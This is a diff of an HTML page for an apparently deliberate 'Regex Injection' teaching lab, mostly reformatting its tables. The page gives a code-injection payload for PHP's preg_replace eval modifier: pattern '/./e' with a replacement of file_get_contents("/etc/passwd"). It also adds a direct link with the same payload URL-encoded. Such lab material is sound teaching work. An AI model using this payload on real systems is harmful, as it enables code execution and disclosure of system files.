@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
   <head>
-  <title>Regex Injection (1)</title>
+    <title>Regex Injection (1)</title>
+    <style type="text/css">.tt { font-family: monospace; }</style>
   </head>
   <body>
     <h1>Regex Injection (1)</h1>
@@ -16,15 +17,17 @@
     <h2>How to use</h2>
     <p>Enter the following parameters to show how the tool should work:</p>
     <table>
-      <tr><td>Pattern:    </td><td>/rubbish/     </td></tr>
-      <tr><td>Replacement:</td><td>great         </td></tr>
-      <tr><td>Subject:    </td><td>PHP is rubbish</td></tr>
+      <tr><td>Pattern:    </td><td class="tt">/rubbish/</td></tr>
+      <tr><td>Replacement:</td><td class="tt">great</td></tr>
+      <tr><td>Subject:    </td><td class="tt">PHP is rubbish</td></tr>
     </table>
+    <h3>Hacking in</h3>
     <p>Enter the following parameters for the attack:</p>
     <table>
-      <tr><td>Pattern:    </td><td>/./e                            </td></tr>
-      <tr><td>Replacement:</td><td>file_get_contents("/etc/passwd")</td></tr>
-      <tr><td>Subject:    </td><td>a                               </td></tr>
+      <tr><td>Pattern:    </td><td class="tt">/./e</td></tr>
+      <tr><td>Replacement:</td><td class="tt">file_get_contents("/etc/passwd")</td></tr>
+      <tr><td>Subject:    </td><td class="tt">a</td></tr>
     </table>
+    <p><a href="regex.php?pattern=%2F.%2Fe&replacement=file_get_contents%28%22%2Fetc%2Fpasswd%22%29&subject=a">Direct link</a>.</p>
   </body>
 </html>
